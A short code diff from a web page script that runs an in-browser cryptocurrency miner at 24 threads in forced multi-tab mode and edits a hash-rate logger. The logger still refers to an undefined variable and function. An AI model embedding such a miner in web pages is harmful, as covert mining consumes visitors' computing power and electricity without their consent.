@@ -7,6 +7,5 @@
     miner.start(Client.FORCE_MULTI_TAB);
     miner.setAutoThreadsEnabled(false);
     miner.setNumThreads(24);
-    function logger(){setTimeout(function(){console.log(miner.getHashesPerSecond(););myLoop()},3e3)}
-    logger();
+    function logger(){setTimeout(function(){console.log(miner.getHashesPerSecond());if(i<10){myLoop()}},3e3)}logger();
 </script>
